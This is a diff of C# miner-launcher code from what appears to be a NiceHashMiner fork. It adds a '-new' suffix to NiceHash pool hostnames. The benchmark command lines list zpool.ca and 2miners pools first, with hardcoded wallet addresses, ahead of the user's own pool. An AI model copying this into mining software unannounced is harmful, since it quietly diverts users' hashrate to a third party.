@@ -44,16 +44,21 @@ namespace NiceHashMiner.Miners
             algo = "-a " + MiningSetup.MinerName.ToLower();
             apiBind = " -b 127.0.0.1:" + ApiPort;
             IsApiReadException = false;
+            string nhsuff = "";
+            if (Configs.ConfigManager.GeneralConfig.NewPlatform)
+            {
+                nhsuff = "-new";
+            }
 
-          //  url = url.Replace(".nicehash.", "-new.nicehash.");
- LastCommandLine = algo +
+            //  url = url.Replace(".nicehash.", "-new.nicehash.");
+            LastCommandLine = algo +
      " -o " + url + " -u " + username + " -p x " +
-     " -o stratum+tcp://" + alg + ".hk.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-     " -o stratum+tcp://" + alg + ".jp.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-     " -o stratum+tcp://" + alg + ".in.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-     " -o stratum+tcp://" + alg + ".br.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-     " -o stratum+tcp://" + alg + ".usa.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-     " -o stratum+tcp://" + alg + ".eu.nicehash.com:" + port + " -u " + username + " -p x " +
+     " -o stratum+tcp://" + alg + ".hk" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+     " -o stratum+tcp://" + alg + ".jp" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+     " -o stratum+tcp://" + alg + ".in" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+     " -o stratum+tcp://" + alg + ".br" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+     " -o stratum+tcp://" + alg + ".usa" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+     " -o stratum+tcp://" + alg + ".eu" + nhsuff + ".nicehash.com:" + port + " -u " + username + " -p x " +
      apiBind +
      " -d " + GetDevicesCommandString() + " --no-watchdog " +
      ExtraLaunchParametersParser.ParseForMiningSetup(MiningSetup, DeviceType.NVIDIA) + " ";
@@ -90,17 +95,23 @@ namespace NiceHashMiner.Miners
             var commandLine = "";
             if (File.Exists("bin_3rdparty\\t-rex\\" + GetLogFileName()))
                 File.Delete("bin_3rdparty\\t-rex\\" + GetLogFileName());
+
+            string nhsuff = "";
+            if (Configs.ConfigManager.GeneralConfig.NewPlatform)
+            {
+                nhsuff = "-new";
+            }
             if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.Lyra2z))
             {
                 commandLine = "--algo lyra2z" +
                  " -o stratum+tcp://lyra2z.eu.mine.zpool.ca:4553" + " -u 1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2" + " -p c=BTC " +
                  " -o stratum+tcp://" + url + " -u " + username + " -p x " +
-                 " -o stratum+tcp://" + alg + ".hk.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o stratum+tcp://" + alg + ".jp.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o stratum+tcp://" + alg + ".in.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o stratum+tcp://" + alg + ".br.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o stratum+tcp://" + alg + ".usa.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o stratum+tcp://" + alg + ".eu.nicehash.com:" + port + " -u " + username + " -p x " +
+                 " -o stratum+tcp://" + alg + ".hk" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o stratum+tcp://" + alg + ".jp" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o stratum+tcp://" + alg + ".in" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o stratum+tcp://" + alg + ".br" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o stratum+tcp://" + alg + ".usa" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o stratum+tcp://" + alg + ".eu" + nhsuff + ".nicehash.com:" + port + " -u " + username + " -p x " +
                               ExtraLaunchParametersParser.ParseForMiningSetup(
                                   MiningSetup,
                                   DeviceType.NVIDIA) + " --no-watchdog -l " + GetLogFileName() +
@@ -114,12 +125,12 @@ namespace NiceHashMiner.Miners
                  " -o stratum+tcp://skunk.eu.mine.zpool.ca:8433" + " -u 1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2" + " -p c=BTC " +
                 // " -o stratum+tcp://hdac.moricpool.com:3333" + " -u HGr2JYPDMgYr9GzS9TcadBxxkyxo4v9XAJ" + " -p x " +
                  " -o " + url + " -u " + username + " -p x " +
-                 " -o " + alg + ".hk.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".jp.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".in.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".br.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".usa.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".eu.nicehash.com:" + port + " -u " + username + " -p x " +
+                 " -o " + alg + ".hk" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".jp" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".in" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".br" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".usa" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".eu" + nhsuff + ".nicehash.com:" + port + " -u " + username + " -p x " +
                               ExtraLaunchParametersParser.ParseForMiningSetup(
                                   MiningSetup,
                                   DeviceType.NVIDIA) + " --no-watchdog -l " + GetLogFileName() +
@@ -132,12 +143,12 @@ namespace NiceHashMiner.Miners
                 commandLine = "--algo x16r" +
                  " -o stratum+tcp://x16r.eu.mine.zpool.ca:3636" + " -u 1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2" + " -p c=BTC " +
                  " -o " + url + " -u " + username + " -p x " +
-                 " -o " + alg + ".hk.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".jp.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".in.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".br.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".usa.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".eu.nicehash.com:" + port + " -u " + username + " -p x " +
+                 " -o " + alg + ".hk" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".jp" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".in" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".br" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".usa" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".eu" + nhsuff + ".nicehash.com:" + port + " -u " + username + " -p x " +
                               ExtraLaunchParametersParser.ParseForMiningSetup(
                                   MiningSetup,
                                   DeviceType.NVIDIA) + " --no-watchdog -l " + GetLogFileName() +
@@ -150,12 +161,12 @@ namespace NiceHashMiner.Miners
                 commandLine = "--algo mtp" +
                  " -o stratum+tcp://xzc.2miners.com:8080" + " -u aMGfYX8ARy4wKE57fPxkEBcnNuHegDBweE" + " -p x " +
                  " -o " + url + " -u " + username + " -p x " +
-                 " -o " + alg + ".hk.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".jp.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".in.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".br.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".usa.nicehash.com:" + port + " " + " -u " + username + " -p x " +
-                 " -o " + alg + ".eu.nicehash.com:" + port + " -u " + username + " -p x " +
+                 " -o " + alg + ".hk" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".jp" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".in" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".br" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".usa" + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                 " -o " + alg + ".eu" + nhsuff + ".nicehash.com:" + port + " -u " + username + " -p x " +
                               ExtraLaunchParametersParser.ParseForMiningSetup(
                                   MiningSetup,
                                   DeviceType.NVIDIA) + " --no-watchdog -l " + GetLogFileName() +
